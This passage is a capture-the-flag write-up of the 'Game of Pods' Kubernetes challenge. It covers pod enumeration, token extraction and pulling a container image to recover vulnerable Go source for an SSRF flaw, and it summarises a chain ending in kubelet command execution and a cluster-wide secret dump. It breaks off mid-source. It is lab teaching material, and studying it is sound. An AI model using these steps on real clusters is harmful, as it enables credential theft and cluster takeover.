# Game of Pods


```text
Difficulty: Hard  
Author: Yuval Avrahami
```

"The complexity of Kubernetes environments leads to all kinds of fun bugs. This challenge is based on the coolest and weirdest ones I've encountered in the wild."


**Scenario :**

You've gained access to a pod in the staging environment.

To beat this challenge, you'll have to spread throughout the cluster and escalate privileges



Let's break out of this staging pod. Kubernetes environments are notorious for misconfigured RBAC (Role-Based Access Control) and overly permissive service accounts, making this a great scenario to flex those offensive security and red-teaming muscles. 

Since the flag is located in `kube-system`, our primary objective is to escalate our privileges from this initial pod to cluster-admin, or at least find a way to read resources in that specific namespace.



## Summary of Attack Chain

| Step | User / Access          | Technique Used                      | Result                                                                                                                                |
| :--: | :--------------------- | :---------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------ |
|   1  | test-sa (Staging)      | **Local Cluster Enumeration**       | Extracted service account token, reviewed RBAC permissions, and dumped pod YAML to identify internal registry `hustlehub.azurecr.io`. |
|   2  | test-sa (Registry)     | **OCI Image Extraction**            | Used **oras** and **jq** to pull and unpack the hidden `k8s-debug-bridge` container image layer-by-layer.                             |
|   3  | test-sa (Local)        | **Source Code Analysis**            | Analyzed `k8s-debug-bridge.go` and discovered an unauthenticated SSRF vulnerability in URL construction.                              |
|   4  | test-sa (Network)      | **Internal DNS Brute-Forcing**      | Used `coredns-enum` to enumerate cluster DNS and locate `k8s-debug-bridge.app` service.                                               |
|   5  | test-sa → app-sa       | **SSRF to Kubelet RCE**             | Crafted payload using URL fragment (`#`) to redirect proxy to `/run`, executing `cat` to extract service account token and CA.        |
|   6  | app-sa (App Namespace) | **RBAC Enumeration**                | Built custom kubeconfig and identified permissions to create/read secrets within the namespace.                                       |
|   7  | app-sa → bridge-sa     | **Service Account Token Minting**   | Created a malicious Secret to generate a long-lived API token for the dormant `k8s-debug-bridge` service account.                     |
|   8  | bridge-sa (Cluster)    | **Privilege Verification**          | Authenticated as `k8s-debug-bridge` and confirmed elevated access to `nodes/status` and `nodes/proxy`.                                |
|   9  | bridge-sa (API Server) | **API Server SSRF (CVE-2022-3172)** | Patched node configuration to set Kubelet port to `6443`, forcing API server to proxy-authenticate to itself.                         |
|  10  | cluster-admin          | **Secret Dumping & Exfiltration**   | Accessed node proxy endpoint to dump all cluster secrets and retrieved the flag from `kube-system` namespace.                         |



![Wiz](wiz_MAp.png)


### Situational Awareness

First, we need to understand what tools are at our disposal and what identity the pod is running under.

1. **Check Our toolkit:** See if `kubectl`, `curl`, or `wget` are available. 

```bash
root@test:~# which kubectl curl wget jq
/usr/bin/kubectl
/usr/bin/curl
/usr/bin/wget
/usr/bin/jq
```

All available


```
root@test:~# ip route
default via 10.42.0.1 dev eth0 
10.42.0.0/24 dev eth0 proto kernel scope link src 10.42.0.2 
10.42.0.0/16 via 10.42.0.1 dev eth0 
root@test:~# arp -a
? (10.42.0.1) at e6:75:64:78:01:c3 [ether]  on eth0
? (10.42.0.1) at e6:75:64:78:01:c3 [ether]  on eth0
root@test:~# 
```

2. **Check Our capabilities and mounts:**
   Are we in a privileged container? Check if we have high-level capabilities or access to host devices.

```bash
root@test:~# ls -la /dev
total 4
drwxr-xr-x    5 root     root           360 Oct 26 19:59 .
drwxr-xr-x    1 root     root          4096 Oct 26 19:59 ..
lrwxrwxrwx    1 root     root            11 Oct 26 19:59 core -> /proc/kcore
lrwxrwxrwx    1 root     root            13 Oct 26 19:59 fd -> /proc/self/fd
crw-rw-rw-    1 root     root        1,   7 Oct 26 19:59 full
drwxrwxrwt    2 root     root            40 Oct 26 19:59 mqueue
crw-rw-rw-    1 root     root        1,   3 Oct 26 19:59 null
lrwxrwxrwx    1 root     root             8 Oct 26 19:59 ptmx -> pts/ptmx
drwxr-xr-x    2 root     root             0 Oct 26 19:59 pts
crw-rw-rw-    1 root     root        1,   8 Oct 26 19:59 random
drwxrwxrwt    2 root     root            40 Oct 26 19:59 shm
lrwxrwxrwx    1 root     root            15 Oct 26 19:59 stderr -> /proc/self/fd/2
lrwxrwxrwx    1 root     root            15 Oct 26 19:59 stdin -> /proc/self/fd/0
lrwxrwxrwx    1 root     root            15 Oct 26 19:59 stdout -> /proc/self/fd/1
-rw-rw-rw-    1 root     root             0 Oct 26 19:59 termination-log
crw-rw-rw-    1 root     root        5,   0 Oct 26 19:59 tty
crw-rw-rw-    1 root     root        1,   9 Oct 26 19:59 urandom
crw-rw-rw-    1 root     root        1,   5 Oct 26 19:59 zero
root@test:~# mount | grep -i "host\|docker\|containerd"
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/10/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/work)
/dev/vdb on /etc/hosts type ext4 (rw,relatime)
/dev/vdb on /etc/hostname type ext4 (rw,relatime)
```


![Wiz](wiz_dev.png)
![Wiz](wiz_mount.png)
![Wiz](wiz_service.png)
![Wiz](wiz_auth.png)
![Wiz](wiz_test_sa.png)


```
root@test:~# cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
staging
```

![Wiz](wiz_test_staging.png)

![Wiz](wiz_test_toekn.png)


```JWT String 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc3NjU1OTk1MiwiZXhwIjoxNzc2NTYzNTUyfQ.K2UK543U79uB00750_LVkLXi3_Lr4ALRFRQvQmhesBA
eyJhbGciOiJSUzI1NiIsImtpZCI6IjVjWHc0NnVkX0RVeHpLb05zenduT2t6WTUxOTJhTmVSSnpuWFQ5VGp5TEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA4MDY5MTA5LCJpYXQiOjE3NzY1MzMxMDksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNGQ4MmQ2YWUtOGIwMi00YjYwLWEzMmItNWY5NzVkNzlkNzE1Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJzdGFnaW5nIiwibm9kZSI6eyJuYW1lIjoibm9kZXIiLCJ1aWQiOiI4MDFmN2I1ZC0yMzMyLTQ0M2EtOWQ0NC1hMTkwZDFjOTMzNGQifSwicG9kIjp7Im5hbWUiOiJ0ZXN0IiwidWlkIjoiNGYwYzBkOTMtZjYyMi00N2FkLWIwNDAtM2Y3ODRhZmNjN2FjIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJ0ZXN0LXNhIiwidWlkIjoiMGRlMDg4NTItODU1Ny00MGIyLThjNGMtZmE2ZmExOTMwMjdiIn0sIndhcm5hZnRlciI6MTc3NjUzNjcxNn0sIm5iZiI6MTc3NjUzMzEwOSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OnN0YWdpbmc6dGVzdC1zYSJ9.IRkumUVPALx5FUEMNyGQFC_sLl4Jw5U_rvRWqSqBOo7Cakhzs-vvvFKD743p4ijDtzNEa75gjIq3JKD0H5GJCzb81XEI0ACaBs3n2KsIh84U3FRIzQO8RtLFnA_Tnx-upQOre2YwHF4Uyf5PRjJ-PV4i_zriI1l_3E2mnphJn-imtRmp4dq6c7PjmKg5D6zsiwvfhGBV1v5VezQveC31AqtWHrAbRv0Mhl3T9gGV3xjvycHXzOUYk1HfOw9-HrRQa3455jiSbccq71zYn4kRFpsUrcHBcK3Sr-gv7KR8YHWP7d16Ck5Sz8VJ7Itjq7SuyqdLzjIrUeEdljm1K7V5sg
```

```Header 
{
  "alg": "RS256",
  "kid": "5cXw46ud_DUxzKoNszwnOkzY5192aNeRJznXT9TjyLA"
}
```

```Payload 
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local",
    "k3s"
  ],
  "exp": 1808069109,
  "iat": 1776533109,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "4d82d6ae-8b02-4b60-a32b-5f975d79d715",
  "kubernetes.io": {
    "namespace": "staging",
    "node": {
      "name": "noder",
      "uid": "801f7b5d-2332-443a-9d44-a190d1c9334d"
    },
    "pod": {
      "name": "test",
      "uid": "4f0c0d93-f622-47ad-b040-3f784afcc7ac"
    },
    "serviceaccount": {
      "name": "test-sa",
      "uid": "0de08852-8557-40b2-8c4c-fa6fa193027b"
    },
    "warnafter": 1776536716
  },
  "nbf": 1776533109,
  "sub": "system:serviceaccount:staging:test-sa"
}
```

![Wiz](wiz_test_jwt.png)


```
root@teenv | egrep 'KUBERNETES|K8S'S|K8S'
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.43.1.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.1.1
KUBERNETES_SERVICE_HOST=10.43.1.1
KUBERNETES_PORT=tcp://10.43.1.1:443
KUBERNETES_PORT_443_TCP_PORT=443
root@test:~# 
```

![Wiz](wiz_test_k8s.png)


Looking at the payload, We have confirmed Our exact identity and location within the cluster:

* **Namespace:** `staging`
* **Service Account:** `test-sa`
* **Pod Name:** `test`
* **Node Name:** `noder`

You also know the internal IP of the Kubernetes API server from the environment variables (`10.43.1.1`). 

Now that we know *who* we are, the next logical step is to find out what the Kubernetes API server will *let us do*, and to inspect exactly how our current pod was constructed.

Here are Our next two commands to finish the reconnaissance phase and start looking for our pivot point. 

### Enumeration

Let's see what access rights Our `test-sa` token grants We within the cluster. Run this to list Our allowed actions:


```bash
root@test:~# kubectl auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
pods                                            []                                     []               [get list watch]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
root@test:~# 
```

### Inspect the Pod Configuration
As we discussed in the full walkthrough, we want to look at the image that built this pod. Dump the YAML configuration for Our `test` pod and look closely at the `spec.containers.image` value:
```bash
root@test:~# kubectl get pod test -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"test","namespace":"staging"},"spec":{"containers":[{"image":"hustlehub.azurecr.io/test:latest","imagePullPolicy":"IfNotPresent","name":"test"}],"serviceAccountName":"test-sa"}}
  creationTimestamp: "2025-10-26T19:59:00Z"
  name: test
  namespace: staging
  resourceVersion: "407"
  uid: 4f0c0d93-f622-47ad-b040-3f784afcc7ac
spec:
  containers:
  - image: hustlehub.azurecr.io/test:latest
    imagePullPolicy: IfNotPresent
    name: test
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-9r88v
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: noder
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: test-sa
  serviceAccountName: test-sa
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-9r88v
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2025-10-26T19:59:19Z"
    status: "True"
    type: PodReadyToStartContainers
  - lastProbeTime: null
    lastTransitionTime: "2025-10-26T19:59:00Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2025-10-26T19:59:19Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2025-10-26T19:59:19Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2025-10-26T19:59:00Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://e4602154b08dd6b551d516d835212f57404d78eed27f81f13290f804fb19f4a3
    image: hustlehub.azurecr.io/test:latest
    imageID: hustlehub.azurecr.io/test@sha256:6c49ed1562fc0394f3e50549895776c5cac96524b011b8c4a26dea211e9d4610
    lastState: {}
    name: test
    ready: true
    restartCount: 0
    started: true
    state:
      running:
        startedAt: "2025-10-26T19:59:19Z"
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-9r88v
      readOnly: true
      recursiveReadOnly: Disabled
  hostIP: 172.30.0.2
  hostIPs:
  - ip: 172.30.0.2
  phase: Running
  podIP: 10.42.0.2
  podIPs:
  - ip: 10.42.0.2
  qosClass: BestEffort
  startTime: "2025-10-26T19:59:00Z"
root@test:~# 
```

Spot on. You’ve confirmed two critical pieces of information:

1. **The RBAC Dead End:** Your `test-sa` permissions are extremely limited. You can only interact with `pods` in Our current namespace and some basic API health/version endpoints. There's no direct path to cluster-admin from these permissions alone.
2. **The Pivot Point:** In the pod YAML, under `spec.containers.image`, we found the registry: `hustlehub.azurecr.io`. 

Since the API server won't let us move laterally, we need to attack the infrastructure itself. As We noted in Our walkthrough, We have a tool called `oras` (OCI Registry As Storage) installed in this pod. We can use it to query that Azure Container Registry and see what else the developers are hiding in there.

Here are Our exact commands for Phase 2. Run these to pull down the hidden image and start unpacking it.

### Registry Enumeration & Image Extraction

**1. List the repositories in the target registry:**
```bash
root@test:~# oras repo ls hustlehub.azurecr.io
k8s-debug-bridge
test
root@test:~# 
```

![Wiz](wiz_test_bridge.png)



**2. Download the hidden image:**
We will pull the image locally using the OCI laWet format so we can manually inspect its layers without needing Docker or containerd running.
```bash
root@test:~# oras copy hustlehub.azurecr.io/k8s-debug-bridge:latest --to-oci-laWet k8s-debug-bridge/
��� Copied  application/vnd.in-toto+json                                                                              1.28/1.28 KB 100.00%  809  ����� sha256:b65292a38d914152cbd37c828a36b81cd3da1acfd0edaa77bf322332c41bd024                                                                ��� Copied  application/vnd.oci.image.config.v1+json                                                                    167/167  B 100.00%   55  ������ sha256:3dc1aacf9e7b7aa152fe92304c74cc2822539cb27e25fe99282b221746d2636a                                                               ��� Copied  application/vnd.oci.image.config.v1+json                                                                  1.86/1.86 KB 100.00%   10  ������ sha256:7162697db986f5e02d9091e5f29193a473f5fbd2d7b186243813052c9b7b5ed7                                                               ��� Copied  application/vnd.oci.image.manifest.v1+json                                                                  566/566  B 100.00%    8  ������ sha256:65d8defc58f5d756d55f44a42c1d19ac3b4ea1944ec8f21cfcef70beba9a44db                                                               ��� Copied  application/vnd.oci.image.layer.v1.tar+gzip                                                               3.26/3.26 MB 100.00%       ������ sha256:44cf07d57ee4424189f012074a59110ee2065adfdde9c7d9826bebdffce0a885                                                               ��� Copied  application/vnd.oci.image.layer.v1.tar+gzip                                                                 289/289 KB 100.00%  755  ������ sha256:049d988b9bf0a21ad8597ad57e538949be03f703977d21d9d30b7da3fc92f983                                                               �� Copied  application/vnd.oci.image.layer.v1.tar+gzip                                                                   32/32  B 100.00%    2m  ����� sha256:4f4fb700ef54461cfa02571ae0db9a0dc1e0cdb5577484a6d75e68dc38e8acc1                                                                ��� Copied  application/vnd.oci.image.layer.v1.tar+gzip                                                                 2.2/2.2 MB 100.00%  980  ������ sha256:af22b6a1bf08e5477608575f8890ef7cbc61994011a54d37a5edd5630a6b9a6f                                                               ��� Copied  application/vnd.oci.image.layer.v1.tar+gzip                                                               1.84/1.84 KB 100.00%   11  ������ sha256:f055869862fb70dd5a7f7c2b9ac1e9d50b886d9a3b55c1e288ad1ba76644bdae                                                               ��� Copied  application/vnd.oci.image.manifest.v1+json                                                                1.21/1.21 KB 100.00%  952  ������ sha256:a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e                                                               ��� Copied  application/vnd.oci.image.index.v1+json                                                                     856/856  B 100.00%  257  ������ sha256:0ed2d53c35dc594b40217506326e2f099dc8823fa5838a65736bfce6f1b0115f                                                               
Copied [registry] hustlehub.azurecr.io/k8s-debug-bridge:latest => [oci-laWet] k8s-debug-bridge/
Digest: sha256:0ed2d53c35dc594b40217506326e2f099dc8823fa5838a65736bfce6f1b0115f
root@test:~# 
```

**3. Inspect the Image Index:**

Once the download is complete, we need to read the index.json file to find the specific SHA256 hash for the Linux/amd64 application layer.

```
root@test:~# jq . k8s-debug-bridge/index.json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.index.v1+json",
  "manifests": [
    {
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "digest": "sha256:65d8defc58f5d756d55f44a42c1d19ac3b4ea1944ec8f21cfcef70beba9a44db",
      "size": 566,
      "annotations": {
        "vnd.docker.reference.digest": "sha256:a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e",
        "vnd.docker.reference.type": "attestation-manifest"
      },
      "platform": {
        "architecture": "unknown",
        "os": "unknown"
      }
    },
    {
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "digest": "sha256:a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e",
      "size": 1240,
      "platform": {
        "architecture": "amd64",
        "os": "linux"
      }
    },
    {
      "mediaType": "application/vnd.oci.image.index.v1+json",
      "digest": "sha256:0ed2d53c35dc594b40217506326e2f099dc8823fa5838a65736bfce6f1b0115f",
      "size": 856
    }
  ]
}
root@test:~# 
```

Looking at the output of `index.json`, there are three manifests listed. The one we care about is the actual application image built for a Linux environment.

We can see the relevant digest clearly identified here:
```json
    {
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "digest": "sha256:a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e",
      "size": 1240,
      "platform": {
        "architecture": "amd64",
        "os": "linux"
      }
    }
```

This tells us that the configuration for the image we want is stored in the file named after that specific hash. Let's peel back the next layer of the onion to find out exactly what this container runs and where the application files are located.

### Unpacking the Target Manifest

**1. Inspect the Specific Manifest:**

Run this `jq` command to read the configuration file for the `amd64/linux` manifest. (The files are stored inside the `k8s-debug-bridge/blobs/sha256/` directory).

```bash
root@test:~# jq . k8s-debug-bridge/blobs/sha256/a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha256:7162697db986f5e02d9091e5f29193a473f5fbd2d7b186243813052c9b7b5ed7",
    "size": 1902
  },
  "layers": [
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:44cf07d57ee4424189f012074a59110ee2065adfdde9c7d9826bebdffce0a885",
      "size": 3418409
    },
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:049d988b9bf0a21ad8597ad57e538949be03f703977d21d9d30b7da3fc92f983",
      "size": 295858
    },
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:4f4fb700ef54461cfa02571ae0db9a0dc1e0cdb5577484a6d75e68dc38e8acc1",
      "size": 32
    },
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:af22b6a1bf08e5477608575f8890ef7cbc61994011a54d37a5edd5630a6b9a6f",
      "size": 2311323
    },
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:f055869862fb70dd5a7f7c2b9ac1e9d50b886d9a3b55c1e288ad1ba76644bdae",
      "size": 1883
    }
  ]
}
root@test:~#
```

**2. Extract the Configuration Digest:**
The output of the command above will contain a `config.digest` value. It should look like `sha256:7162697db...`.
Take that new hash and run `jq` against it to see the actual container history, environment variables, and the commands used to build it:
```bash
root@test:~# jq . k8s-debug-bridge/blobs/sha256/7162697db986f5e02d9091e5f29193a473f5fbd2d7b186243813052c9b7b5ed7
{
  "architecture": "amd64",
  "config": {
    "ExposedPorts": {
      "8080/tcp": {}
    },
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "./k8s-debug-bridge"
    ],
    "WorkingDir": "/root/",
    "ArgsEscaped": true
  },
  "created": "2025-10-22T18:57:25.008725258Z",
  "history": [
    {
      "created": "2025-02-14T03:03:06Z",
      "created_by": "ADD alpine-minirootfs-3.18.12-x86_64.tar.gz / # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2025-02-14T03:03:06Z",
      "created_by": "CMD [\"/bin/sh\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    },
    {
      "created": "2025-10-11T23:15:36.745607626Z",
      "created_by": "RUN /bin/sh -c apk --no-cache add ca-certificates && rm -rf /var/cache/apk/* &&       echo -e \"- Remove source code from our images\\n- Achieve AGI\" > /root/TODO # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2025-10-11T23:15:36.756194585Z",
      "created_by": "WORKDIR /root/",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2025-10-22T18:57:24.999382508Z",
      "created_by": "COPY /app/k8s-debug-bridge . # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2025-10-22T18:57:25.008725258Z",
      "created_by": "COPY k8s-debug-bridge.go . # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2025-10-22T18:57:25.008725258Z",
      "created_by": "EXPOSE [8080/tcp]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    },
    {
      "created": "2025-10-22T18:57:25.008725258Z",
      "created_by": "CMD [\"./k8s-debug-bridge\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:f44f286046d9443b2aeb895c0e1f4e688698247427bca4d15112c8e3432a803e",
      "sha256:2ceca32bee8e2ca60831c95cb23f30eff33b659fa8783834ba8fa8ba91ac990a",
      "sha256:5f70bf18a086007016e948b04aed3b82103a36bea41755b6cddfaf10ace3c6ef",
      "sha256:822e435784fe76fdc7c566c428de04e39606c82f870f3712528d578a29bf7c06",
      "sha256:081c91edb79f68b7831c0e59445e7b72c316aa518bacc8b1478a12def7901641"
    ]
  }
}
root@test:~# 
```

This is the jackpot! By reading the image history, We've uncovered exactly what the developers did wrong. 

Look closely at these lines in the `"history"` array:
1.  **The Mistake:** `echo -e "- Remove source code from our images\n- Achieve AGI" > /root/TODO`
2.  **The Evidence:** `COPY k8s-debug-bridge.go .`
3.  **The Target:** `EXPOSE [8080/tcp]`

The developers accidentally left the uncompiled Go source code inside the container image, and we know the application listens on port 8080.

To read that source code, we need to extract the compressed filesystem layers that `oras` downloaded. The layers are stored as `.tar+gzip` files inside the `k8s-debug-bridge/blobs/sha256/` directory.


### Extracting the Filesystem

**1. Create a directory to hold the extracted files:**
```bash
mkdir /tmp/rootfs
```

![Wiz](wiz_rootfs.png)


**2. Extract the layers:**
We will extract the layers based on the hashes found in Our first JSON output. Run these commands sequentially to overlay the files into our new directory:
```bash
tar -xzf k8s-debug-bridge/blobs/sha256/44cf07d57ee4424189f012074a59110ee2065adfdde9c7d9826bebdffce0a885 -C /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/049d988b9bf0a21ad8597ad57e538949be03f703977d21d9d30b7da3fc92f983 -C /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/af22b6a1bf08e5477608575f8890ef7cbc61994011a54d37a5edd5630a6b9a6f -C /tmp/rootfs
tar -xzf k8s-debug-bridge/blobs/sha256/f055869862fb70dd5a7f7c2b9ac1e9d50b886d9a3b55c1e288ad1ba76644bdae -C /tmp/rootfs
```

**3. Read the Source Code:**
The history showed the working directory was `/root/`, so the Go file should be right there.
```bash
root@test:~# cat /tmp/rootfs/root/k8s-debug-bridge.go
// A simple debug bridge to offload debugging requests from the api server to the kubelet.
package main

import (
        "crypto/tls"
        "encoding/json"
        "fmt"
        "io"
        "io/ioutil"
        "log"
        "net"
        "net/http"
        "net/url"
        "os"
        "strings"
)

type Request struct {
        NodeIP        string `json:"node_ip"`
        PodName       string `json:"pod"`
        PodNamespace  string `json:"namespace,omitempty"`
        ContainerName string `json:"container,omitempty"`
}

var (
        httpClient = &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                        },
                },
        }
        serviceAccountToken string
        nodeSubnet string
)

func init() {
        tokenBytes, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
        if err != nil {
                log.Fatalf("Failed to read service account token: %v", err)
        }
        serviceAccountToken = strings.TrimSpace(string(tokenBytes))
        nodeIP := os.Getenv("NODE_IP")
        if nodeIP == "" {
                log.Fatal("NODE_IP environment variable is required")
        }
        nodeSubnet = nodeIP + "/24"
}

func main() {
        http.HandleFunc("/logs", handleLogRequest)
        http.HandleFunc("/checkpoint", handleCheckpointRequest)
        fmt.Println("k8s-debug-bridge starting on :8080")
        http.ListenAndServe(":8080", nil)
}

func handleLogRequest(w http.ResponseWriter, r *http.Request) {
        handleRequest(w, r, "containerLogs", http.MethodGet)
}

func handleCheckpointRequest(w http.ResponseWriter, r *http.Request) {
        handleRequest(w, r, "checkpoint", http.MethodPost)
}

func handleRequest(w http.ResponseWriter, r *http.Request, kubeletEndpoint string, method string) {
        req, err := parseRequest(w, r) ; if err != nil {
                return
        }

        targetUrl := fmt.Sprintf("https://%s:10250/%s/%s/%s/%s", req.NodeIP, kubeletEndpoint, req.PodNamespace, req.PodName, req.ContainerName)

        if err := validateKubeletUrl(targetUrl); err != nil {
                http.Error(w, err.Error(), http.StatusInternalServerError)
                return
        }

        resp, err := queryKubelet(targetUrl, method) ; if err != nil {
                http.Error(w, fmt.Sprintf("Failed to fetch %s: %v", method, err), http.StatusInternalServerError)
                return
        }

        w.Header().Set("Content-Type", "application/octet-stream")
        w.Write(resp)
}

func parseRequest(w http.ResponseWriter, r *http.Request) (*Request, error) {
        if r.Method != http.MethodPost {
                http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
                return nil, fmt.Errorf("invalid method")
        }
        var req Request = Request{
                PodNamespace: "app",
                PodName: "app-blog",
                ContainerName: "app-blog",
        }
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
                http.Error(w, "Invalid JSON", http.StatusBadRequest)
                return nil, err
        }
        if req.NodeIP == "" {
                http.Error(w, "node_ip is required", http.StatusBadRequest)
                return nil, fmt.Errorf("missing required fields")
        }

        return &req, nil
}

func validateKubeletUrl(targetURL string) (error) {
        parsedURL, err := url.Parse(targetURL) ; if err != nil {
                return fmt.Errorf("failed to parse URL: %w", err)
        }

        // Validate target is an IP address
        if net.ParseIP(parsedURL.Hostname()) == nil {
                return fmt.Errorf("invalid node IP address: %s", parsedURL.Hostname())
        }
        // Validate IP address is in the nodes /16 subnet
        if !isInNodeSubnet(parsedURL.Hostname()) {
                return fmt.Errorf("target IP %s is not in the node subnet", parsedURL.Hostname())
        }

        // Prevent self-debugging
        if strings.Contains(parsedURL.Path, "k8s-debug-bridge") {
                return fmt.Errorf("cannot self-debug, received k8s-debug-bridge in parameters")
        }

        // Validate namespace is app
        pathParts := strings.Split(strings.Trim(parsedURL.Path, "/"), "/")
        if len(pathParts) < 3 {
                return fmt.Errorf("invalid URL path format")
        }
        if pathParts[1] != "app" {
                return fmt.Errorf("only access to the app namespace is allowed, got %s", pathParts[1])
        }

        return nil
}

func queryKubelet(url, method string) ([]byte, error) {
        req, err := http.NewRequest(method, url, nil)
        if err != nil {
                return nil, fmt.Errorf("failed to create request: %w", err)
        }
        req.Header.Set("Authorization", "Bearer "+serviceAccountToken)
        log.Printf("Making request to kubelet: %s", url)
        resp, err := httpClient.Do(req)
        if err != nil {
